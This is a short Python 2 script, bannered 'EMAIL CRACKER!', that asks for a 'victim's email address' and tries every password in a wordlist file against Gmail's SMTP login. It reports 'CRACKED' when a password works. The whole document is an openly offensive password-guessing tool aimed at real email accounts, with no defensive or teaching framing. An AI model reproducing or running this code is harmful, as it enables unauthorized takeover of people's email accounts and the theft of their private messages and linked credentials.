import smtplib
 
class bcolors:
    OK = '\033[92m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    ENDC = '\033[0m'
    UNDERLINE = '\033[4m'





smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

print bcolors.BOLD + "  .-------------------."
print bcolors.BOLD + "  |  EMAIL CRACKER!   |"
print bcolors.BOLD + "  '-------------------'"
print bcolors.BOLD + "      ^      (\_/)"
print bcolors.BOLD + "      '----- (O.o)"
print bcolors.BOLD + "             (> <)"

print bcolors.BOLD + ""
print bcolors.BOLD + "     "

user = raw_input(bcolors.BOLD + "Enter the victim's email address: ")
passwfile = "psw.list"
passwfile = open(passwfile, "r")

for password in passwfile:
	try:
		smtpserver.login(user, password)
		print bcolors.BOLD + "CRACKED: %s"  % password + bcolors.ENDC
		break;
	except smtplib.SMTPAuthenticationError:
		print bcolors.FAIL + "FAILED: %s" % password + bcolors.ENDC
